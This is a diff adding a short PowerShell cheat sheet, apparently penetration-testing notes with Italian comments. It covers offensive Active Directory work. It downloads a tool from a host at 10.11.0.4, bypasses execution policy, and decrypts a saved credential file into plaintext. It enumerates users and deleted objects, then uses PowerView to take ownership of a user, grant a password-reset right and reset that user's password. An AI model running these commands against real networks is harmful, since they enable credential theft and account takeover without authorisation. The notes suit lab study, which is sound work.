@@ -1,0 +1,37 @@
+Set-ExecutionPolicy Unrestricted
+Get-ExecutionPolicy
+
+TRANSFER FILES WITH POWERSHELL:
+    powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
+
+
+
+
+
+powershell -Command "$cred=Import-CliXml -Path .\cred.xml; $cred.GetNetworkCredential() | Format-List *"
+
+
+
+Get-ADUser -identity s.smith -properties *
+Get-ADObject -Filter {SamAccountName -eq "TempAdmin"} -IncludeDeletedObjects -Properties *
+
+
+
+Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" -IncludeDeletedObjects
+
+
+
+
+
+
+POVERVIEW:
+  //se non si è già in powershell, entrare in powershell con:
+  //powershell.exe -nop -exec bypass
+  Import-Module .\PowerView.ps1
+
+  Set-DomainObjectOwner -Identity claire -OwnerIdentity tom                     //set tom come owner di claire
+  Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword     //dai a tom permessi per cambiare la pwd di claire
+
+  //cambia pwd per utente
+  $cred = ConvertTo-SecureString "password123!" -AsPlainText -force
+  Set-DomainUserPassword -identity claire -accountpassword $cred
